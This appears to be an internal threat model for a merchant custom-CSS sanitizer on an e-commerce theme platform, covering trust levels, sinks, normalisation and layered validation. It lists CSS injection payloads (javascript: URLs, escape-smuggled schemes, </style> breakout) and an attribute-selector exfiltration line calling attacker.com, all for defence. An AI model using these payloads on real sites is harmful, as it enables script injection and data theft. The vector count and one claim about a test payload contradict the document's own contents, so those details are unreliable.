# Custom Code Security — Merchant CSS Threat Model

**Program:** LetBuyy Liquid Theme Platform + Shopify-Class Merchant Editor (M→AE)
**Phase produced in:** AA — Custom CSS + Code Workspace
**Date:** 2026-07-11
**Applies to:** `packages/theme-engine/src/custom-css-sanitizer.ts`, `CustomCssWorkspace.tsx`, `settings/route.ts` PATCH guard

---

## 1. Scope

This document covers the threat model for **merchant-authored custom CSS**: text entered in the `CustomCssWorkspace` component and stored in `site_settings.custom_css` (JSONB). It does not cover:
- First-party theme CSS bundled by the build pipeline (fully trusted).
- Liquid template tags (LIQUID canary off; governed separately when turned on).
- App-marketplace app extensions (frozen).
- Media assets uploaded by merchants (governed by media-service, reserved).

---

## 2. Trust Model

| Actor | Trust level | Can write `custom_css` |
|-------|-------------|------------------------|
| LetBuyy first-party theme engine | Fully trusted | Yes — bypasses validator; writes final bundle CSS directly |
| Authenticated merchant (via `CustomCssWorkspace`) | Untrusted input | Yes — subject to SAFE-CSS validation at client + proxy + (future) renderer |
| Unauthenticated visitor | Zero trust | No — requires authenticated merchant session |
| Direct PATCH to `/api/stores/:store/settings` | Untrusted input | Yes — same server-side validation guard applied |
| Gateway | Forwarded only after proxy validation | N/A |

**SAFE-CSS LAW:** merchant-authored CSS is untrusted. Every path that touches `custom_css` must validate it through `validateAndScopeCustomCss` (engine canonical) or an equivalent checked-in implementation before any output.

---

## 3. Attack Surface

### 3.1 Where merchant CSS enters the system

| Entry point | Validation status |
|-------------|-------------------|
| `CustomCssWorkspace.tsx` blur + save (client) | Validated (inline validator) |
| `appearance/page.tsx` `handleSave` (client) | Validated (import from `CustomCssWorkspace.tsx`) |
| `settings/route.ts` PATCH (server/proxy) | Validated (`validateCustomCss` from `@letbuyy/theme-engine`) |
| api-gateway `PATCH /v1/stores/:store/settings` | Not independently validated — relies on proxy being the sole caller; direct gateway bypass is guarded by `verifySiteOwnership` RLS |
| `buildLiquidThemeHeadAssets(bundle, rawCustomCss?)` render entrypoint | Validated internally (fail-closed) |
| Storefront render call site (`layout.tsx` line 585) | NOT-CONNECTED — `rawCustomCss` not yet passed |

### 3.2 Where merchant CSS exits the system (output sinks)

| Sink | Phase AA status |
|------|-----------------|
| `<style data-theme-renderer="liquid">` in storefront `<head>` | NOT-CONNECTED — call site not yet wired |
| Theme editor preview `<style>` element | NOT-CONNECTED — live-preview component not yet built |
| Downloaded theme bundle (Phase AB export) | Out of scope for Phase AA |

Because both output sinks are NOT-CONNECTED in Phase AA, the net exploitability of any bypass in the Phase AA validator is currently zero. The validator must be correct before the sinks are wired.

---

## 4. Injection Vector Taxonomy

The following 22 vector classes were threat-modelled and blocked. Each has a corresponding test in `custom-css-sanitizer.test.ts` whose removal would cause a test failure.

### 4.1 Script execution vectors

| ID | Vector | Mechanism | Blocked by |
|----|--------|-----------|------------|
| V-01 | `url(javascript:...)` | Direct scheme — `background: url(javascript:alert(1))` | `UNSAFE_CSS_URL_SCHEME_PREFIXES` match after normalisation |
| V-02 | `url(javascript:...)` (whitespace-smuggled) | `java\tscript:`, `java\nscript:`, `j a v a s c r i p t :` | Step 4 whitespace collapse before prefix match |
| V-03 | `url(javascript:...)` (unicode-escaped) | `url(\6a\61\76\61\73\63\72\69\70\74:...)` | Step 2 Unicode hex decode before prefix match |
| V-04 | `url(vbscript:...)` | VBScript scheme (IE) | `UNSAFE_CSS_URL_SCHEME_PREFIXES` |
| V-05 | `url(data:text/html;...)` | HTML data URI with `<script>` | `UNSAFE_CSS_URL_SCHEME_PREFIXES` |
| V-06 | `url(data:image/svg+xml;...)` | SVG data URI with embedded `<script>` | `UNSAFE_CSS_URL_SCHEME_PREFIXES` (`data:image/svg`) |
| V-07 | `url(data:*javascript*)` | JS MIME type variants | `UNSAFE_CSS_URL_SCHEME_PREFIXES` |
| V-08 | `url(data:*ecmascript*)` | ECMAScript MIME type | `UNSAFE_CSS_URL_SCHEME_PREFIXES` (shared prefix `data:text/ecmascript`, `data:application/ecmascript`) |
| V-09 | `url(data:application/xhtml+xml)` | XHTML data URI | `UNSAFE_CSS_URL_SCHEME_PREFIXES` |
| V-10 | `url(blob:...)` | Blob URL referencing script Blob | `UNSAFE_CSS_URL_SCHEME_PREFIXES` |
| V-11 | `expression(...)` | IE CSS expression eval | Literal `expression(` pattern after normalisation |
| V-12 | `behavior: url(...)` | IE `.htc` behavior | Literal `behavior:` pattern |
| V-13 | `-moz-binding: url(...)` | Firefox XUL/XBL binding | Literal `-moz-binding:` pattern |
| V-14 | `-o-link:` / `-o-link-source:` | Opera CSS link injection | Literal `-o-link:` / `-o-link-source:` patterns |
| V-15 | `filter: progid:DXImageTransform.*` | IE filter expression | Literal `filter:progid:` after whitespace collapse |

### 4.2 Markup breakout vectors

| ID | Vector | Mechanism | Blocked by |
|----|--------|-----------|------------|
| V-16 | `</style>` (literal) | Closes containing `<style>` element; subsequent bytes parsed as HTML markup | Literal `</style>` pattern + case-insensitive |
| V-17 | `</style>` (unicode-encoded) | `\3c /style\3e` | Step 2 Unicode decode before pattern match |
| V-18 | `<` in CSS text | Angle bracket injection; breaks out of `<style>` context | Literal `<` character blocked |
| V-19 | CSS unicode escapes for `<`, `>` | `\3c`, `\003c`, etc. | Step 2 Unicode decode before `<` check |
| V-20 | `<!--`, `-->` HTML comment markers | IE CSS comment quirk (IE parses CSS inside `<!--…-->`) | Literal `<!--` and `-->` patterns |

### 4.3 Encoding / parser confusion vectors

| ID | Vector | Mechanism | Blocked by |
|----|--------|-----------|------------|
| V-21 | Non-hex backslash escape (`@\import`) | CSS spec: `\X` where X is not a hex digit → treated as X; `@\import` → `@import` | Step 3 non-hex backslash decode; then `@import` pattern match |
| V-22 | Null bytes (`\x00`) | String truncation in some parsers | Literal null byte pattern |

### 4.4 Control flow vectors

| ID | Vector | Mechanism | Blocked by |
|----|--------|-----------|------------|
| V-23 | `@import` (any form) | Load external stylesheet; data exfiltration + remote script injection via CSS | Literal `@import` pattern after normalisation |
| V-24 | `@charset` | Encoding-shift attack | Literal `@charset` pattern |
| V-25 | `@namespace` | Namespace prefix injection | Literal `@namespace` pattern |
| V-26 | Unbalanced closing `}` | Escapes `.lb-theme { }` scope wrapper; bare selectors reach outer document | Brace-depth scanner; depth < 0 → violation |

---

## 5. Safe CSS Allow-List

The validator uses a deny-list approach (block known-bad patterns after normalisation) rather than a positive allow-list. The rationale: CSS is too expressive to enumerate all safe selectors, properties, and values. The deny-list blocks all known attack vector classes, and the normalisation pipeline prevents bypass.

The following CSS constructs are explicitly confirmed safe (each has a corresponding `AA-SAFE-*` test in `custom-css-sanitizer.test.ts`):

| Category | Examples |
|----------|---------|
| Colour values | `color: #ff0000;` · `background: rgba(0,0,0,0.5);` · `color: hsl(120, 100%, 50%);` |
| Media queries | `@media (max-width: 768px) { ... }` · `@media (prefers-color-scheme: dark) { ... }` |
| CSS custom properties | `color: var(--lb-primary);` · `padding: var(--lb-space-2);` |
| Flexbox / Grid | `display: flex;` · `display: grid;` · `grid-template-columns: repeat(3, 1fr);` |
| Transitions / Transforms | `transition: color 0.3s ease;` · `transform: translateY(-4px);` |
| Keyframe animations | `@keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }` (no `expression()` or `url()` inside) |
| Support queries | `@supports (display: grid) { ... }` |
| Pseudo-classes / pseudo-elements | `:hover`, `:focus`, `::before`, `::after` |
| `url()` with safe schemes | `background: url('https://cdn.letbuyy.com/image.png')` (HTTPS external — allowed; no block on fetch itself, but see RISK-AA-04 note below) |
| Multi-selector rules | `.product-card, .collection-item { ... }` |
| Nested at-rules | `@media (max-width: 600px) { .hero { font-size: 1.2rem; } }` |

**Note on HTTPS `url()` values:** HTTPS URLs in `background-image` etc. are not blocked by the Phase AA validator. They allow merchants to reference external images (legitimate use case). This is a design choice: CSS `background-image: url(https://...)` does not execute scripts. The risk of data exfiltration via CSS attribute selectors + `url()` (e.g., `input[value^="a"] { background: url(https://attacker.com/?c=a) }`) is acknowledged as RISK-AA-04 (NOT registered in Phase AA risk register; noted here for threat-model completeness). This risk is accepted because: (1) storefront render path NOT-CONNECTED in Phase AA; (2) the pattern requires merchant control + attacker coordination; (3) mitigated by CSP in production.

---

## 6. Normalisation Pipeline

The bypass prevention model depends on normalising merchant CSS before applying any pattern checks. Four steps are applied in order:

```
raw CSS
  │
  ▼ Step 1: stripCssBlockComments
  │   Remove /* ... */ block comments (with nesting depth tracking).
  │   Prevents: expression split via comment: ex/**/pression → expression
  │   Note: expression() COMMENT-SPLIT bypass via /* */ is still theoretically
  │   possible if the regex scanner does not handle all whitespace forms before
  │   the expression() check. See RISK-AA-02.
  │
  ▼ Step 2: decodeCssUnicodeEscapes
  │   Decode \XXXXXX (1–6 hex digits + optional trailing space) to their Unicode chars.
  │   Prevents: \3c → < (HTML angle bracket); \6a\61\76\61... → javascript
  │
  ▼ Step 3: decodeCssNonHexEscapes
  │   For \X where X is NOT a hex digit: replace with X.
  │   Prevents: @\import → @import (non-hex backslash CSS spec rule)
  │
  ▼ Step 4: collapseControlAndWhitespace
  │   Replace C0 control chars and all ASCII whitespace with a single space.
  │   Prevents: java\tscript: → javascript: (whitespace-smuggled scheme)
  │
  ▼ normalised CSS string
    (all pattern checks run on this)
```

**Lane B deviation:** `CustomCssWorkspace.tsx` includes a 5th normalisation step (internal whitespace collapse inside `url()` — collapses `url( javascript : ... )` form). Lane A does not add this step because Steps 1–4 + the `url()` prefix scan already handle this class. The deviation is conservative (Lane B is stricter), not a gap.

---

## 7. Scoping Model

Valid merchant CSS is wrapped by the sanitizer:

```css
.lb-theme {
  <merchant css>
}
```

The scope class `.lb-theme` is set via the `scopeSelector` option (default: `'.lb-theme'`). In the storefront, the `<body>` element (or the theme root container) carries the `.lb-theme` class, so all merchant CSS applies within that scope.

**Bypass risk — unbalanced `}`:** If the merchant CSS contains `}` to close the `.lb-theme` wrapper prematurely, selectors following that `}` would target the outer document. This is prevented by the brace-depth scanner (Step V-26 above): any CSS that results in negative brace depth at any point is rejected.

**Browser floor (RISK-AA-03):** CSS Nesting requires Chrome 112+ / Firefox 117+ / Safari 17.2+. Browsers below this floor will not scope the merchant CSS (it will still apply; it just won't be scoped to `.lb-theme`). The risk is accepted for the India-first market. Fallback `@scope` or duplicated-selector approaches are deferred to a future phase.

---

## 8. DOMPurify Boundary

DOMPurify is an HTML sanitizer. It is applied to Liquid-rendered HTML to remove dangerous HTML constructs. It is NOT a CSS sanitizer.

**What DOMPurify does:**
- Removes script-executing HTML attributes (`onclick`, `onload`, `href="javascript:"`, etc.).
- Enforces an allowlist of HTML element types and attributes.
- Removes unknown/forbidden elements (by default) or strips their attributes.

**What DOMPurify does NOT do:**
- Parse or inspect CSS property values inside `<style>` elements.
- Block `expression()`, `url(javascript:)`, or other CSS-level attack vectors.
- DOMPurify's `ALLOWED_TAGS` includes `style` (required for Liquid theme CSS). A `<style>` element with `expression()` passes DOMPurify unchanged.

**`LIQUID_RENDERED_HTML_DOMPURIFY_CONFIG` is LOCKED.** Phase AA does not modify it (ART-17 / FORBID list). Merchant custom CSS never passes through DOMPurify — it is validated by the Phase AA CSS sanitizer and injected as a separate `<style>` element at render time, not inline in Liquid HTML.

This separation means:
1. The CSS sanitizer does not need to concern itself with HTML-level attacks (handled by DOMPurify on the Liquid side).
2. DOMPurify does not need to be extended for CSS-level attacks (handled by the CSS sanitizer).
3. Neither sanitizer is weakened to accommodate the other.

---

## 9. Multi-Layer Enforcement Architecture

```
Merchant browser
  │  [CustomCssWorkspace: client-side validation on blur + before save]
  │  Returns: violation list inline (no round-trip needed for feedback)
  │
  ▼
merchant-control-plane Next.js server
  │  [settings/route.ts PATCH: validateCustomCss from @letbuyy/theme-engine]
  │  Returns: HTTP 422 with violations[] if invalid
  │  Purpose: prevents direct API bypass without going through the browser UI
  │
  ▼
api-gateway (Hono, /v1)
  │  [No independent CSS validation — relies on proxy being sole caller]
  │  RLS: verifySiteOwnership required
  │
  ▼
Supabase (JSONB stored in site_settings.custom_css)
  │
  ▼  [Phase AB — not yet wired]
buildLiquidThemeHeadAssets(bundle, rawCustomCss)
  │  [fail-closed: invalid CSS → dropped; only base style returned]
  │  [single enforcement point in the render pipeline]
  │
  ▼
<style data-theme-renderer="liquid"> in storefront <head>
```

**Defense in depth:** three independent enforcement layers (client, proxy, renderer). A bypass at any one layer must also bypass the next. The renderer is the final backstop and is fail-closed.

---

## 10. Threat Table

| Threat | Attacker | Impact | Layer stopped at | Residual risk |
|--------|----------|--------|-----------------|---------------|
| CSS expression injection (`expression()`) | Authenticated merchant or API caller | Script execution in IE | Client + proxy + renderer | Near-zero (IE market negligible; RISK-AA-02 for comment-split) |
| `url(javascript:)` injection | Authenticated merchant or API caller | Script execution in legacy browsers | Client + proxy + renderer | Near-zero |
| `url(data:image/svg+xml...)` injection | Authenticated merchant or API caller | Script execution via SVG | Client + proxy + renderer | None |
| `@import` data exfiltration | Authenticated merchant or API caller | External stylesheet load + data exfiltration | Client + proxy + renderer | None |
| `</style>` breakout | Authenticated merchant or API caller | HTML injection after breakout | Client + proxy + renderer | None |
| CSS unicode-escape bypass | Sophisticated API caller (no browser validation) | Depends on vector | Proxy + renderer | None (both decode before check) |
| Non-hex backslash bypass (`@\import`) | Sophisticated API caller | `@import` smuggling | Proxy + renderer | None |
| Unbalanced `}` scope escape | Authenticated merchant or API caller | Unscoped selectors reach document | Client + proxy + renderer | None (brace-depth scanner) |
| HTTPS `url()` CSS attribute exfiltration | Authenticated merchant with attacker coordination | User data exfiltration via CSS | NOT blocked | Accepted (see §5 note); CSP mitigates in production |
| Byte limit bypass (store >50 kB CSS) | Authenticated merchant or API caller | DoS via large CSS parse | Client + proxy | None (`CUSTOM_CSS_MAX_BYTES = 50_000`) |
| Direct gateway call (bypass proxy) | Authenticated merchant with API access | Skip proxy validation | Renderer (fail-closed) | Low — gateway requires valid merchant JWT + site ownership |
| expression() comment-split bypass | Sophisticated API caller | Script execution in IE | Renderer partially (RISK-AA-02) | Very low (IE-only) |

---

## 11. Phase AA Open Security Items

The following items were deferred from Phase AA hardening and are tracked in `RISK_REGISTER.md`:

**RISK-AA-01** (LOW): Test `AA-SEC-07b` is tautological — the payload `\3c /style\3e` contains a literal `<` character and so would be blocked by the `<` angle-bracket check even without Step 2. A complementary test with a payload that contains ONLY the escape form (no literal angle bracket) is needed to prove Step 2 is the blocking mechanism. Target: Phase AB or next `custom-css-sanitizer.test.ts` touch.

**RISK-AA-02** (LOW): `expression()` comment-split bypass — `ex/**/pression` passes DOMPurify (HTML sanitizer; irrelevant for CSS), and the Phase AA `stripCssBlockComments` step removes the `/* */`, yielding `expression`. Whether this is then caught depends on the order of normalisation steps. Step 1 (strip comments) runs first, so `ex/**/pression` → `expression` → caught by the `expression(` pattern. However, the interaction is subtle and the test coverage for this exact form is incomplete. RISK-AA-02 tracks this gap. Target: Phase AB.

**RISK-AA-03** (LOW): CSS Nesting browser floor. See §7. Accepted.
